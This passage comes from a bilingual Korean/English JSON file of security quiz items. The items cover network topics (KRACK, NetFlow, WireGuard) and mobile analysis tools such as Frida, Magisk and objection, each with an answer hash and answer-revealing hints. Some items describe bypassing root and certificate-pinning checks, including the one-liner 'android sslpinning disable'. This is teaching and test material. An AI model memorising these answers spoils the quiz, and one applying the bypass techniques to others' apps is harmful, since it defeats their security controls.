      "ko": "2017년 WPA2 의 4-way 핸드셰이크 결함으로, 공격자가 세 번째 메시지를 재전송해 단말이 이미 쓴 키를 다시 설치하고 카운터를 되돌리게 만들 수 있었습니다. 암호를 몰라도 트래픽이 복호화되었죠. 이 키 재설치 공격에 붙은 한 단어짜리 이름은?",
      "en": "In 2017 a flaw in the WPA2 four-way handshake let an attacker replay message three, forcing the client to reinstall an already-used key and reset its counter — decrypting traffic without ever learning the passphrase. What one-word name was given to this key reinstallation attack?"
    },
    "hints": {
      "ko": [
        "'Key Reinstallation AttaCK' 에서 뽑아낸, 균열을 뜻하는 단어의 일부러 틀린 철자입니다.",
        "해결은 새 비밀번호가 아니라 단말 쪽 패치였습니다."
      ],
      "en": [
        "A deliberate misspelling of the word for a crack or flaw, drawn out of 'Key Reinstallation AttaCK'.",
        "The fix was a client-side patch, not a new passphrase."
      ]
    }
  },
  {
    "id": "t4_netflow",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 190,
    "ci": true,
    "hash": "fc9c32a4bcde53e93edee75376691f5192b33ca4f197c78805ce9d748ae0cdf5",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "패킷 대신 대화 기록",
      "en": "Conversations, Not Packets"
    },
    "prompt": {
      "ko": "규모가 커지면 모든 패킷을 저장할 수 없으므로, 라우터는 대화 단위로 출발지·목적지·포트·프로토콜·바이트/패킷 수를 담은 레코드를 내보냅니다. 몇 달 뒤에도 주기적 통신이나 대용량 전송을 찾아내기에 충분하죠. 지금은 IPFIX 로 표준화된 이 흐름 레코드에 시스코가 붙인 이름은? (붙여서 한 덩어리로)",
      "en": "Storing every packet is impossible at scale, so routers export one record per conversation — source, destination, ports, protocol, byte and packet counts — enough to spot a periodic call-home or a large transfer months later. What is Cisco's name for these flow records, now generalized as IPFIX? (one token)"
    },
    "hints": {
      "ko": [
        "'net' 뒤에 '흐름' 을 뜻하는 영어 단어를 붙였습니다.",
        "템플릿은 아홉 번째 버전에서 도입되었고, 이를 바탕으로 만든 IETF 표준이 IPFIX 입니다."
      ],
      "en": [
        "'net' joined with the English word for a stream of movement.",
        "Templates arrived in its ninth version; the IETF standard built on it is IPFIX."
      ]
    }
  },
  {
    "id": "t4_wireguard",
    "tier": 4,
    "cat": "network",
    "track": "network",
    "points": 200,
    "ci": true,
    "hash": "28387a164997aec602d65711a6a74d4ee162d8fb5987702e7962031a61262887",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "4천 줄짜리 VPN",
      "en": "A VPN in Four Thousand Lines"
    },
    "prompt": {
      "ko": "이 VPN 은 리눅스 커널 안에 수천 줄로 구현되어 있고, 암호 협상을 아예 제공하지 않으며(고정된 현대 알고리즘 한 벌), SSH 처럼 공개키로 상대를 식별하고, UDP 위에서 동작합니다. 이름은? (붙여서 한 덩어리로)",
      "en": "This VPN lives in the Linux kernel in a few thousand lines, offers no cipher negotiation at all (one fixed modern suite), identifies peers by public key the way SSH does, and runs over UDP. What is it called? (one token)"
    },
    "hints": {
      "ko": [
        "'선(wire)' 뒤에 '지키는 사람' 을 뜻하는 영어 단어를 붙였습니다.",
        "코드가 작아 감사하기 쉽다는 점이 강점이었고, 리눅스 5.6 에 병합되었습니다."
      ],
      "en": [
        "'wire' joined with the English word for one who protects.",
        "Its small codebase was the argument for auditability; it merged into Linux 5.6."
      ]
    }
  },
  {
    "id": "t0_adb",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 40,
    "ci": true,
    "hash": "7e16a033d8a9e716f5572ef0b23b296050bcf72c23a67c1198b995de62701b20",
    "fmt": "명령어 / command (3글자 / 3 chars)",
    "title": {
      "ko": "기기와 PC를 잇는 다리",
      "en": "The Bridge to the Handset"
    },
    "prompt": {
      "ko": "USB나 네트워크로 안드로이드 기기와 통신하면서 연결 목록 확인, 파일 주고받기, 셸 실행까지 하는 세 글자 명령줄 도구는? (명령어 이름)",
      "en": "Which three-letter command-line tool talks to an Android handset over USB or the network — listing what is connected, moving files both ways, opening a shell? (command name)"
    },
    "hints": {
      "ko": [
        "Android Debug Bridge의 머리글자입니다.",
        "`____ devices` 로 연결된 기기를 확인하고, `____ shell` 로 셸에 들어갑니다."
      ],
      "en": [
        "The initials of Android Debug Bridge.",
        "`____ devices` lists what is connected; `____ shell` drops you into one."
      ]
    }
  },
  {
    "id": "t0_logcat",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 45,
    "ci": true,
    "hash": "b54dba0f4f562ebe1c69b0ab6871de94590a8b3ea83ff3609b1a9a200fd41491",
    "fmt": "명령어 / command",
    "title": {
      "ko": "기기가 혼잣말하는 곳",
      "en": "What the Handset Says to Itself"
    },
    "prompt": {
      "ko": "안드로이드의 시스템·앱 로그 버퍼를 실시간으로 흘려보내는 명령은? 앱이 죽었을 때, 그리고 개발자가 실수로 값을 찍어둔 걸 찾을 때 가장 먼저 보는 곳입니다. (한 단어)",
      "en": "Which Android command streams the system and application log buffers in real time — the first place to look when an app dies, and where a developer's stray debug print turns up? (one word)"
    },
    "hints": {
      "ko": [
        "`log` 뒤에 파일을 이어 붙여 출력하는 유닉스 명령 이름이 붙어 있습니다.",
        "`-s MyApp:D` 처럼 태그와 우선순위로 걸러서 봅니다."
      ],
      "en": [
        "It joins `log` with the name of the Unix command that concatenates files.",
        "You filter it by tag and priority, as in `-s MyApp:D`."
      ]
    }
  },
  {
    "id": "t0_ipa",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 45,
    "ci": true,
    "hash": "78324857e8d9bfa749dc301271df54a6572de9f4c3df8a9507cfa7b7d2b25f8e",
    "fmt": "확장자 / extension (3글자 / 3 chars)",
    "title": {
      "ko": "애플 쪽 꾸러미",
      "en": "The Package on the Apple Side"
    },
    "prompt": {
      "ko": "iOS 애플리케이션은 어떤 세 글자 확장자를 가진 아카이브로 배포될까요? 안드로이드 쪽 패키지 파일에 대응하는 형식입니다. (점 없이, 소문자)",
      "en": "An iOS application ships as an archive carrying which three-letter file extension — the counterpart to the package file on the Android side? (no dot, lowercase)"
    },
    "hints": {
      "ko": [
        "iOS App Store Package의 머리글자입니다.",
        "확장자를 .zip 으로 바꿔 풀면 안에 `Payload/` 폴더가 들어 있습니다."
      ],
      "en": [
        "The initials of iOS App Store Package.",
        "Rename it to .zip, unpack it, and a `Payload/` folder is inside."
      ]
    }
  },
  {
    "id": "t0_plist",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 50,
    "ci": true,
    "hash": "9ceec13202afbf12ee3abb994c669c711749c18e194326734db6123e94947e04",
    "fmt": "확장자 / extension (5글자 / 5 chars)",
    "title": {
      "ko": "애플이 설정을 담는 그릇",
      "en": "How Apple Keeps Its Settings"
    },
    "prompt": {
      "ko": "애플 플랫폼은 앱 설정과 번들 메타데이터(Info 파일, 환경설정 등)를 XML 또는 그것을 압축한 바이너리 형태의 파일에 담습니다. 그 파일의 확장자는? (점 없이, 소문자, 다섯 글자)",
      "en": "Apple platforms keep app settings and bundle metadata — the Info file, preferences — in files stored as XML or as a packed binary form of it. What is that file extension? (no dot, lowercase, five characters)"
    },
    "hints": {
      "ko": [
        "`property list` 를 줄인 말입니다.",
        "`plutil -convert xml1` 로 바이너리 형태를 읽을 수 있는 텍스트로 바꿉니다."
      ],
      "en": [
        "A contraction of `property list`.",
        "`plutil -convert xml1` turns the packed binary form back into readable text."
      ]
    }
  },
  {
    "id": "t0_imei",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 50,
    "ci": true,
    "hash": "f93f54d9bf26556c995f8871b142d3376b33cb85825001d08a80891be4cc338f",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "기기 자체에 새겨진 번호",
      "en": "The Number Burned Into the Handset"
    },
    "prompt": {
      "ko": "가입자나 SIM이 아니라 단말기 그 자체에 고유한 15자리 식별번호를 가리키는 네 글자 약어는? 통신사가 도난 단말을 차단할 때 쓰는 번호입니다.",
      "en": "What four-letter acronym names the 15-digit identifier unique to the handset itself — not to the SIM and not to the subscriber — the number a carrier blocks when a device is reported stolen?"
    },
    "hints": {
      "ko": [
        "International Mobile Equipment Identity의 머리글자입니다.",
        "단말기에서 `*#06#` 를 누르면 화면에 뜹니다."
      ],
      "en": [
        "The initials of International Mobile Equipment Identity.",
        "Dial `*#06#` on the handset and it appears on screen."
      ]
    }
  },
  {
    "id": "t0_sqlite",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 50,
    "ci": true,
    "hash": "0cd8666848bf286d951c3d230e8b6e092fde03c3a080e3454467e496e7b14e78",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "앱이 모든 걸 쌓아두는 곳",
      "en": "Where the App Keeps Everything"
    },
    "prompt": {
      "ko": "메시지, 연락처, 통화 기록, 브라우저 방문 기록 — 안드로이드와 iOS 양쪽 모두 앱이 이 데이터를 서버 없이 파일 하나로 동작하는 내장형 데이터베이스에 담아둡니다. 그 데이터베이스 엔진의 이름은? (한 단어)",
      "en": "Messages, contacts, call logs, browsing history — on both mobile platforms an app keeps them in a serverless, single-file embedded database. What is that database engine called? (one word)"
    },
    "hints": {
      "ko": [
        "파일은 보통 `.db` 로 끝나고, 엔진 이름은 질의 언어 이름으로 시작합니다.",
        "옆에 놓인 저널·선행기록 파일에 지워진 행이 남아 있는 경우가 많아 포렌식에서 먼저 챙깁니다."
      ],
      "en": [
        "Its files usually end in `.db`, and the engine's name starts with the query language's name.",
        "The journal and write-ahead files beside it often still hold deleted rows, which is why forensics grabs them too."
      ]
    }
  },
  {
    "id": "t0_smishing",
    "tier": 0,
    "cat": "mobile",
    "track": "mobile",
    "points": 60,
    "ci": true,
    "hash": "78c73f4ad535fc2356cf220584e870928ae0e84c6b93f4f310fcf684a13089ed",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "문자로 오는 미끼",
      "en": "The Bait That Arrives by Text"
    },
    "prompt": {
      "ko": "이메일이 아니라 문자메시지로 전달되는 피싱 — 가짜 로그인 페이지나 앱 설치로 이어지는 링크가 문자로 오는 수법을 가리키는 영어 한 단어는?",
      "en": "What single English word names phishing delivered by text message rather than email — a link in an SMS leading to a fake login page or an app install?"
    },
    "hints": {
      "ko": [
        "`SMS` 와 `phishing` 을 합친 말입니다.",
        "음성 통화로 하는 사촌뻘 수법은 vishing 이라고 부릅니다."
      ],
      "en": [
        "A blend of `SMS` and `phishing`.",
        "Its voice-call cousin goes by vishing."
      ]
    }
  },
  {
    "id": "t1_frida",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 70,
    "ci": true,
    "hash": "db77ca6bb991f807190b0c8cb00c09b74094f089a2efb2a0e629d00540973846",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "달리는 앱에 손을 넣다",
      "en": "Reaching Into a Running App"
    },
    "prompt": {
      "ko": "실행 중인 안드로이드·iOS 프로세스 안에 자바스크립트 엔진을 밀어 넣어, 함수의 인자와 반환값을 실행 도중에 바꿔치기할 수 있게 해주는 동적 계측 도구는? 루팅 탐지나 인증서 검사를 무력화하는 표준 수단입니다. (한 단어)",
      "en": "Which dynamic instrumentation toolkit pushes a JavaScript engine into a live process on either mobile platform, letting you rewrite a function's arguments and return value as it runs — the standard way to neutralise a root check or a certificate check? (one word)"
    },
    "hints": {
      "ko": [
        "북유럽 여자 이름에서 따왔고, CLI로 `____-trace` 같은 도구가 함께 옵니다.",
        "`Java.perform(function(){ ... })` 안에서 대상 앱의 클래스를 바꿔치기합니다."
      ],
      "en": [
        "Named after a Nordic given name; its CLI ships `____-trace` alongside.",
        "`Java.perform(function(){ ... })` runs your replacement inside the target app."
      ]
    }
  },
  {
    "id": "t1_smali",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 65,
    "ci": true,
    "hash": "ffedf9e8186b7de0f265c93bbad5be7d98ac729b682d41018660b782e8c14e1d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "안드로이드 바이트코드의 사람 말",
      "en": "Android Bytecode You Can Read"
    },
    "prompt": {
      "ko": "안드로이드 패키지의 바이트코드를 풀면, 사람이 읽고 고친 뒤 다시 조립할 수 있는 어셈블리 비슷한 중간 언어가 나옵니다. 검사를 걷어내고 앱을 다시 빌드하는 고전적 수법이 여기서 나옵니다. 이 언어의 이름은? (한 단어)",
      "en": "Unpacking an Android package's bytecode yields an assembly-like intermediate language you can read, edit and reassemble — the classic way to strip a check and rebuild the app. What is that language called? (one word)"
    },
    "hints": {
      "ko": [
        "아이슬란드어로 `어셈블러`를 뜻하는 단어입니다.",
        "파일은 `.____` 로 끝나고 `invoke-virtual` 같은 줄로 채워져 있습니다."
      ],
      "en": [
        "The Icelandic word for `assembler`.",
        "The files end in `.____` and are full of lines like `invoke-virtual`."
      ]
    }
  },
  {
    "id": "t1_magisk",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 65,
    "ci": true,
    "hash": "0c93ab2fe5044f4c0b20b7d78b969dec372970a5002a195ff891f5fddc604e83",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "시스템을 건드리지 않는 루팅",
      "en": "Rooting Without Touching the System"
    },
    "prompt": {
      "ko": "`/system` 을 고치는 대신 부트 이미지를 패치하는 방식으로 루팅하고, 모듈 체계와 금융 앱에 들키지 않게 감추는 기능을 함께 제공하는 안드로이드 프레임워크는? (한 단어)",
      "en": "Which Android framework roots a device by patching the boot image instead of modifying `/system`, and ships a module system plus a hiding feature so banking apps do not notice? (one word)"
    },
    "hints": {
      "ko": [
        "`systemless` 루팅이라는 말이 이 도구에서 나왔습니다.",
        "모듈은 읽기 전용 파티션을 건드리지 않고 마운트 위에 얹히는 방식으로 설치됩니다."
      ],
      "en": [
        "The phrase `systemless root` came from this tool.",
        "Its modules mount on top rather than writing into the read-only partition."
      ]
    }
  },
  {
    "id": "t1_mobsf",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 65,
    "ci": true,
    "hash": "9556953937616fdd7b1bbae66a034a19f4096c5cd7c9c5c6bedb4f3131cfe923",
    "fmt": "도구 이름 / tool name (5글자 / 5 chars)",
    "title": {
      "ko": "올려두면 알아서 훑는다",
      "en": "Upload It and It Reads Everything"
    },
    "prompt": {
      "ko": "안드로이드·iOS 패키지를 올리면 정적 분석과 동적 분석을 자동으로 돌려 점수가 매겨진 보고서를 웹 화면에 뽑아주는 오픈소스 프레임워크의 짧은 이름은? (다섯 글자)",
      "en": "Which open-source framework takes an uploaded package from either mobile platform, runs static and dynamic analysis automatically, and produces a scored report in a web page? (the short name, five characters)"
    },
    "hints": {
      "ko": [
        "Mobile Security Framework를 줄인 이름입니다.",
        "하드코딩된 키, 바깥에 열려 있는 컴포넌트, 약한 암호 사용을 한 번에 짚어줍니다."
      ],
      "en": [
        "Short for Mobile Security Framework.",
        "It flags hardcoded keys, components left open to other apps, and weak crypto in one pass."
      ]
    }
  },
  {
    "id": "t1_androguard",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 60,
    "ci": true,
    "hash": "40f882cd892640537bd13d0db2ab65721cb2ea4dcb89118fea6350d2d2f3fc1d",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "파이썬으로 패키지를 뜯다",
      "en": "Taking a Package Apart in Python"
    },
    "prompt": {
      "ko": "안드로이드 패키지를 프로그램으로 분석할 수 있게 해주는 파이썬 라이브러리·도구 모음은? 매니페스트, 인증서, 바이트코드, 호출 그래프를 다루며 자동 분석기들의 엔진 노릇을 합니다. (한 단어)",
      "en": "Which Python library and toolset parses Android packages programmatically — manifest, certificates, bytecode, call graphs — and sits underneath most automated package analysers as their engine? (one word)"
    },
    "hints": {
      "ko": [
        "`Andro` 뒤에 `보초·수호자`를 뜻하는 영단어가 붙어 있습니다.",
        "보통 `AnalyzeAPK()` 한 번 호출로 시작합니다."
      ],
      "en": [
        "`Andro` joined with the English word for a sentry or protector.",
        "You normally start with a single `AnalyzeAPK()` call."
      ]
    }
  },
  {
    "id": "t1_xposed",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 70,
    "ci": true,
    "hash": "1a8cda18718af69436f38ba17672ca4e688b04d01fde043696a1cd91935cbaba",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "앱을 다시 빌드하지 않고 바꾼다",
      "en": "Changing an App Without Rebuilding It"
    },
    "prompt": {
      "ko": "어떤 패키지도 다시 포장하지 않고, 모듈을 얹어 앱과 시스템 자체의 자바 메서드 동작을 실행 시점에 바꿔버리는 오래된 안드로이드 프레임워크는? (한 단어, X로 시작)",
      "en": "Which veteran Android framework lets modules change the behaviour of apps — and of the system itself — by hooking Java methods at runtime, without repackaging a single app? (one word, starts with X)"
    },
    "hints": {
      "ko": [
        "영단어 `exposed` 에서 앞 모음을 뺀 철자입니다.",
        "루트와 부팅 과정에 얹히는 프레임워크가 필요하며, 요즘 다시 구현된 것이 LSPosed 입니다."
      ],
      "en": [
        "The English word `exposed` with the leading vowel dropped.",
        "It needs root and a framework hooked into boot; LSPosed is the modern reimplementation."
      ]
    }
  },
  {
    "id": "t1_manifest",
    "tier": 1,
    "cat": "mobile",
    "track": "mobile",
    "points": 60,
    "ci": true,
    "hash": "4d6d5495f4d21e18bb99cafab67d86e1d05f668ed210f65c398352ee73751303",
    "fmt": "파일 이름 / file name (19글자 / 19 chars)",
    "title": {
      "ko": "제일 먼저 열어보는 파일",
      "en": "The First File a Reviewer Opens"
    },
    "prompt": {
      "ko": "안드로이드 패키지 안에서 앱의 구성요소, 요구 권한, 그리고 다른 앱이 그 구성요소에 닿을 수 있는지를 정하는 플래그를 선언하는 파일은? 분석자가 가장 먼저 여는 파일입니다. (확장자까지)",
      "en": "Which file inside an Android package declares the app's components, the permissions it asks for, and the flags deciding whether other apps may reach those components — the first file a reviewer opens? (file name with extension)"
    },
    "hints": {
      "ko": [
        "패키지 루트에 있고, 디코드하기 전에는 바이너리 XML로 들어 있습니다.",
        "`____.xml` — 플랫폼 이름 뒤에 배의 적하목록을 뜻하는 영단어가 붙습니다."
      ],
      "en": [
        "It sits at the package root, stored as binary XML until you decode it.",
        "`____.xml` — the platform's own name followed by the English word for a ship's cargo list."
      ]
    }
  },
  {
    "id": "t2_exported",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 90,
    "ci": true,
    "hash": "427da8ba22c9532ad8030312c9c265f2e239456d024bc2c38b99cd9d5fabadab",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "바깥으로 열린 문",
      "en": "The Door Left Open Outward"
    },
    "prompt": {
      "ko": "안드로이드 매니페스트에서 액티비티·서비스·리시버에 붙는 불리언 속성 하나가, 기기에 설치된 다른 앱이 그 구성요소를 직접 호출할 수 있는지를 결정합니다. 권한 선언 없이 참으로 두면 아무 앱이나 바로 들어옵니다. 이 속성의 이름은? (소문자 한 단어)",
      "en": "In an Android manifest one boolean attribute on an activity, service or receiver decides whether other applications on the device may invoke it directly. Left true with no permission beside it, any installed app walks straight in. What is that attribute called? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "`밖으로 내보내다`라는 뜻의 영어 동사의 과거분사형입니다.",
        "API 31부터는 인텐트 필터가 있으면 이 값을 반드시 명시해야 합니다."
      ],
      "en": [
        "The past participle of the English verb meaning `to send out`.",
        "Since API 31 it must be declared explicitly whenever an intent filter is present."
      ]
    }
  },
  {
    "id": "t2_debuggable",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 85,
    "ci": true,
    "hash": "e8d50b39c1715fa546274d4c6200c535a8599eb7f0c4b3cf82c4c0a26c8dbbc2",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "출시본에 남은 스위치",
      "en": "The Switch Left On in the Release"
    },
    "prompt": {
      "ko": "릴리스 빌드에 이 매니페스트 플래그가 참인 채로 나가면, 기기에 있는 누구든 그 앱 프로세스에 디버거를 붙여 메모리를 읽을 수 있습니다. 이 플래그의 이름은? (소문자 한 단어)",
      "en": "If a release build ships with this manifest flag set true, anyone on the device can hook a debugger onto the app process and read its memory. What is the flag called? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "`debug` 에 `~할 수 있는`을 뜻하는 어미가 붙은 형용사입니다.",
        "자동 점검 도구가 출시 빌드의 대표적 실수로 지목하고, 스토어도 이 상태의 빌드를 거부합니다."
      ],
      "en": [
        "The adjective made from `debug` plus the ending meaning `capable of`.",
        "Scanners flag it as the classic release-build blunder, and the store rejects such a build."
      ]
    }
  },
  {
    "id": "t2_keychain",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 90,
    "ci": true,
    "hash": "350ced6e5159ece6ce1355bd5038aa53f1825528c9b7b83fee7a683351d4895b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "아이폰이 비밀을 넣어두는 곳",
      "en": "Where the iPhone Puts Its Secrets"
    },
    "prompt": {
      "ko": "iOS에서 앱의 비밀번호·토큰·인증서를 담아두는 암호화된 시스템 저장소의 이름은? 항목마다 보호 등급이 붙어, 화면이 잠긴 동안 읽을 수 있는지가 정해집니다. (영어 한 단어)",
      "en": "On iOS, which encrypted system store holds an app's passwords, tokens and certificates, with each item tagged by a protection class that decides whether it can be read while the screen is locked? (one English word)"
    },
    "hints": {
      "ko": [
        "열쇠를 꿰어 두는 고리를 뜻하는 영단어입니다.",
        "`...WhenUnlocked` 로 표시된 항목은 잠긴 상태에서는 읽히지 않습니다."
      ],
      "en": [
        "The English word for the ring you keep your keys on.",
        "Items marked `...WhenUnlocked` stay unreadable while the device is locked."
      ]
    }
  },
  {
    "id": "t2_keystore",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 90,
    "ci": true,
    "hash": "284aaf4da604624b89af5327fadfd2c05bdb818ae8222755e2649dd7a223d244",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "키를 꺼내지 않고 쓴다",
      "en": "Using a Key Without Ever Holding It"
    },
    "prompt": {
      "ko": "안드로이드에서 앱이 키의 바이트를 한 번도 읽지 않은 채 서명·복호화에 사용할 수 있도록, 키 자체는 하드웨어 안에 두고 연산만 대신해 주는 시스템 저장소의 이름은? (한 단어)",
      "en": "On Android, which system-backed store lets an app sign or decrypt with a key while never reading the key's bytes — the material stays inside hardware and only the operation comes back? (one word)"
    },
    "hints": {
      "ko": [
        "`key` 뒤에 `물건을 넣어두는 곳`을 뜻하는 영단어가 붙습니다.",
        "키마다 화면 잠금 해제나 지문 인증을 매번 요구하도록 묶어둘 수 있습니다."
      ],
      "en": [
        "`key` joined with the English word for a place where things are kept.",
        "A key can be bound to require a screen unlock or a fingerprint before every use."
      ]
    }
  },
  {
    "id": "t2_webview",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 85,
    "ci": true,
    "hash": "0acd18246f16d696d2fc996fba2c89a24e8af3e89c40e74b3e21e4f62a3d9b0f",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "앱 속의 브라우저",
      "en": "A Browser Inside the App"
    },
    "prompt": {
      "ko": "앱 화면 안에 브라우저 엔진을 심어 페이지를 그려주는 안드로이드 구성요소는? 자바스크립트를 켜고 자바 객체를 그 안으로 이어주는 순간 원격 코드 실행 통로가 됩니다. (한 단어)",
      "en": "Which Android component embeds a browser engine inside an app to render pages — and turns into a remote-code path the moment the app enables JavaScript and bridges a Java object into it? (one word)"
    },
    "hints": {
      "ko": [
        "`web` 뒤에 UI 화면 요소를 뜻하는 영단어가 붙습니다.",
        "API 17 이전에는 `addJavascriptInterface` 하나로 임의 메서드가 열렸습니다."
      ],
      "en": [
        "`web` joined with the English word for a UI element you look at.",
        "Before API 17, `addJavascriptInterface` alone exposed arbitrary methods."
      ]
    }
  },
  {
    "id": "t2_mitmproxy",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 80,
    "ci": true,
    "hash": "ce9f671e0613719d1ca3c3a40d1051a489226520a5d0b7b5b1b076f8386a99b3",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "터미널에서 트래픽을 가로채다",
      "en": "Intercepting Traffic From a Terminal"
    },
    "prompt": {
      "ko": "파이썬 애드온으로 스크립트를 짤 수 있고 콘솔에서 대화형으로 흐름을 들여다보는 HTTPS 가로채기 프록시는? 휴대폰 트래픽을 명령줄로 볼 때 표준처럼 쓰입니다. (한 단어)",
      "en": "Which console-based interactive HTTPS interception proxy — scriptable with Python addons — is the usual command-line choice for watching a handset's traffic? (one word)"
    },
    "hints": {
      "ko": [
        "중간자 공격을 뜻하는 네 글자 약어 뒤에 중계 서버를 뜻하는 영단어가 붙습니다.",
        "`____ -s script.py` 로 애드온을 얹어 흐름을 즉석에서 고쳐 씁니다."
      ],
      "en": [
        "The four-letter abbreviation for a machine-in-the-middle attack joined with the word for an intermediary server.",
        "`____ -s script.py` loads an addon that rewrites flows on the fly."
      ]
    }
  },
  {
    "id": "t2_objection",
    "tier": 2,
    "cat": "mobile",
    "track": "mobile",
    "points": 100,
    "ci": true,
    "hash": "4194b692f5789e4b223671d25da3dd235692fd43dc7df93536bbc79edd70b8e0",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "스크립트 없이 바로",
      "en": "No Script Required"
    },
    "prompt": {
      "ko": "계측 엔진 위에 얹혀서, 스크립트를 한 줄도 짜지 않고 인증서 검증 끄기·루팅 탐지 우회·iOS 자격증명 저장소 덤프 같은 작업을 명령 한 줄로 해주는 모바일 탐색 도구는? (한 단어)",
      "en": "Which runtime mobile exploration toolkit rides on top of the instrumentation engine and gives you one-line commands — turn off certificate validation, bypass root checks, dump the iOS credential store — with no scripting at all? (one word)"
    },
    "hints": {
      "ko": [
        "법정에서 변호사가 외치는 그 영단어입니다.",
        "`android sslpinning disable` 같은 한 줄 명령이 대표적입니다."
      ],
      "en": [
        "The English word a lawyer shouts in court.",
        "`android sslpinning disable` is one of its signature one-liners."
      ]
    }
  },
  {
    "id": "t3_sqlcipher",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 105,
    "ci": true,
    "hash": "dd1238bf489d99d5431a583104be059406a0a48bfa9a6b29ec388e25c3cfa98d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "파일을 가져가도 못 읽는다",
      "en": "Take the File, Read Nothing"
    },
    "prompt": {
      "ko": "모바일 내장형 데이터베이스에 그대로 끼워 넣어 파일 전체를 AES로 투명하게 암호화해 주는 확장은? 기기에서 파일만 빼내 봐야 키 없이는 아무것도 안 나옵니다. (한 단어)",
      "en": "Which drop-in extension to the embedded mobile database transparently encrypts the entire file with AES, so pulling the file off the handset yields nothing without the key? (one word)"
    },
    "hints": {
      "ko": [
        "질의 언어 이름 뒤에 암호를 뜻하는 영단어가 붙습니다.",
        "메신저들이 이걸 쓰고, 분석자는 앱이 키를 어디에 숨겼는지부터 찾습니다."
      ],
      "en": [
        "The query language's name joined with the English word for a cipher.",
        "Messaging apps use it, so an analyst's first job is finding where the app stashed the key."
      ]
    }
  },
  {
    "id": "t3_apfs",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 110,
    "ci": true,
    "hash": "7f84316a5f2d53f24e49949bc0e7e18e0488a8398fcfa802d92fe50adcaf977e",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "플래시를 위해 새로 짠 파일시스템",
      "en": "A Filesystem Written for Flash"
    },
    "prompt": {
      "ko": "iOS 10.3부터 애플 기기의 파일시스템은 플래시 저장장치를 염두에 두고 새로 만든 것으로 바뀌었습니다. 기록 시 복사 방식의 클론과 파일별 암호화 키를 쓰며, 그전의 저널링 파일시스템을 대체했습니다. 네 글자 이름은?",
      "en": "Since iOS 10.3 the filesystem on Apple devices has been the one written for flash storage — copy-on-write clones, a key per file — replacing the journaled filesystem used before. What is its four-letter name?"
    },
    "hints": {
      "ko": [
        "Apple File System의 머리글자입니다.",
        "기록 시 복사 구조 때문에, 지운 파일의 블록이 다른 곳에서 여전히 참조되고 있을 수 있습니다."
      ],
      "en": [
        "The initials of Apple File System.",
        "Because of its copy-on-write design, a deleted file's blocks may still be referenced elsewhere."
      ]
    }
  },
  {
    "id": "t3_zygote",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 115,
    "ci": true,
    "hash": "d8be86c985bdd2938cc6cdc9b43039273be1fd97f3e4daed0329bade585dd6ef",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "모든 앱의 어버이",
      "en": "The Parent Every App Is Forked From"
    },
    "prompt": {
      "ko": "안드로이드의 모든 애플리케이션 프로세스는, 런타임과 프레임워크 클래스를 미리 올려둔 하나의 부모 프로세스에서 갈라져 나옵니다. 덕분에 앱 시작이 빠르고 메모리 페이지가 공유됩니다. 이 부모 프로세스의 이름은? (생물학 용어에서 온 한 단어)",
      "en": "On Android every application process is forked from one already-initialised parent that has the runtime and framework classes preloaded — which is why app start is fast and the pages are shared. What is that parent process called? (one word, borrowed from biology)"
    },
    "hints": {
      "ko": [
        "수정 직후 하나의 세포를 가리키는 생물학 용어이고, 거기서 모든 세포가 갈라져 나옵니다.",
        "모든 앱에 한꺼번에 영향을 주려는 후킹 프레임워크는 바로 여기에 자신을 끼워 넣습니다."
      ],
      "en": [
        "The biology term for the single cell formed at fertilisation, from which every other cell divides.",
        "A hooking framework that wants to reach every app injects itself right here."
      ]
    }
  },
  {
    "id": "t3_overlay",
    "tier": 3,
    "cat": "mobile",
    "track": "mobile",
    "points": 130,
    "ci": true,
    "hash": "b4b33d2441645d4dd0a0694b5989a0a14a5cc22fe9865e6b7b7eae966e0de36c",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "진짜 화면 위에 덧씌운 가짜",
      "en": "A Fake Drawn Over the Real One"
    },
    "prompt": {
